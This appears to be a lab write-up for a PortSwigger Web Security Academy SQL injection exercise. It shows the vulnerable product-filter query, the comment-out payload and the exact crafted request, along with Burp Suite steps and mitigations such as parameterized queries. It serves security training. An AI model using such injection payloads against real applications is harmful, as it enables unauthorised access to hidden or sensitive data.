# Lab 01 – Hidden Data Retrieval

## Lab Information

| Item | Value |
|------|-------|
| Platform | PortSwigger Web Security Academy |
| Category | SQL Injection |
| Topic | Hidden Data Retrieval |
| Difficulty | Apprentice |
| Status | ✅ Solved |

---

# Objective

Exploit a SQL Injection vulnerability in the `category` parameter to retrieve hidden products that should not normally be displayed.

---

# Lab Description

The application filters products using a SQL query similar to:

```sql
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1;
```

The application does not properly sanitize user input, allowing SQL Injection.

---

# Vulnerability

**Type**

SQL Injection

**Location**

WHERE Clause

**Parameter**

category

---

# Payload

```sql
'--
```

Final request

```
GET /filter?category=Gifts'--
```

---

# Attack Flow

1. Browse the Gifts category.
2. Capture the request using Burp Suite Proxy.
3. Send the request to Repeater.
4. Append `'--` to the category parameter.
5. Send the request.
6. Hidden products become visible.
7. Lab solved.

---

# Impact

An attacker can bypass application filtering and access sensitive or hidden data.

---

# Mitigation

- Parameterized Queries
- Prepared Statements
- Input Validation
- Least Privilege Database User

---

# Files

- 01-notes.md
- 02-payloads/payloads.txt
- 03-report.md
- 04-references.md
- 05-screenshots/
- 06-burp/

---

# Tools Used

- Burp Suite Professional
- Firefox
- PortSwigger Web Security Academy

---

# Result

✅ Successfully solved the lab.

## Skills Demonstrated

- SQL Injection Testing
- Burp Suite Proxy
- Burp Suite Repeater
- HTTP Request Analysis
- Manual Web Application Testing